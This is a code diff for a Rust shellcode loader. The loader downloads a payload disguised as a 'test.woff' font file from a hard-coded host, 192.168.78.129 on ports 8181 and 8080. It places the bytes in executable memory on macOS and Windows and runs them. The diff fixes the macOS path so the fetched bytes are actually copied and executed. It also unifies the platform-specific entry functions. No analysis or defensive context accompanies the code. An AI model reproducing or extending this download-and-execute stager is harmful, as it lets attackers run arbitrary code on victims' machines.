@@ -1,12 +1,20 @@
-use winapi::um::winnt::{PVOID, MEM_COMMIT,MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
-// use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
-use winapi::um::processthreadsapi;
-use winapi::um::synchapi::WaitForSingleObject;
-use winapi::um::errhandlingapi;
-use winapi::um::winbase;
+//common use
 use std::ptr;
 use std::process;
-use bytes::{Bytes};
+use bytes::Bytes;
+//windows use
+#[cfg(target_os = "windows")]
+use winapi::um::winnt::{PVOID, MEM_COMMIT,MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
+#[cfg(target_os = "windows")]
+use winapi::um::processthreadsapi;
+#[cfg(target_os = "windows")]
+use winapi::um::synchapi::WaitForSingleObject;
+#[cfg(target_os = "windows")]
+use winapi::um::errhandlingapi;
+#[cfg(target_os = "windows")]
+use winapi::um::winbase;
+// macos
+#[cfg(target_os = "macos")]
 use mmap::{MapOption, MemoryMap};
 
 type DWORD = u32;
@@ -31,26 +39,31 @@ fn getscode(url: &str) -> Bytes {
 #[cfg(target_os = "macos")]
 fn dne() {
     let rbytes = getscode("http://192.168.78.129:8181/test.woff");
-    let map = MemoryMap::new(
-        instructions.len(),
-        &[
-            MapOption::MapAddr(0 as *mut u8),
-            MapOption::MapOffset(0),
-            MapOption::MapFd(-1),
-            MapOption::MapReadable,
-            MapOption::MapWritable,
-            MapOption::MapExecutable,
-            MapOption::MapNonStandardFlags(libc::MAP_ANON),
-            MapOption::MapNonStandardFlags(libc::MAP_PRIVATE),
-        ],
-    )
-    .unwrap();
-    let func: unsafe extern "C" fn() = mem::transmute(map.data());
-    func();
+    unsafe {
+        let map = MemoryMap::new(
+            rbytes.len(),
+            &[
+                MapOption::MapAddr(0 as *mut u8),
+                MapOption::MapOffset(0),
+                MapOption::MapFd(-1),
+                MapOption::MapReadable,
+                MapOption::MapWritable,
+                MapOption::MapExecutable,
+                MapOption::MapNonStandardFlags(libc::MAP_ANON),
+                MapOption::MapNonStandardFlags(libc::MAP_PRIVATE),
+            ],
+        )
+        .unwrap();
+
+        std::ptr::copy(rbytes.as_ptr(), map.data(), rbytes.len());
+
+        let func: unsafe extern "C" fn() = mem::transmute(map.data());
+        func();
+    }
 }
 
 #[cfg(target_os = "windows")]
-fn dne_win() {
+fn dne() {
     //download the payload
     let rbytes = getscode("http://192.168.78.129:8080/test.woff");
     // allocate and copy
@@ -104,8 +117,6 @@ fn dne_win() {
             println!("{}", error.to_string())
         }
     }
-
-    
 }
 
 fn main() {
